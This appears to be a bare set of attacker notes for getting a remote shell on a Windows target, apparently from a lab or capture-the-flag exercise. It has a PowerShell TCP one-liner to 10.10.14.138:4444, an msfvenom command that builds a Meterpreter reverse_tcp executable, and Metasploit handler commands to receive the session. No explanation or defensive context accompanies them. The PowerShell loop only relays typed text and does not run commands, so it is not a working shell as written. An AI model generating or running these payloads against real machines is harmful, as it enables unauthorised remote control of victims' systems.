powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.138',4444);$stream = $client.GetStream();$writer = New-Object System.IO.StreamWriter($stream);$reader = New-Object System.IO.StreamReader($stream);while($true){$writer.WriteLine((Read-Host));$writer.Flush();$reader.ReadLine()}"


msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.138 LPORT=4444 -f exe -o ./payload.exe\n

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.138
set LPORT 4444
run
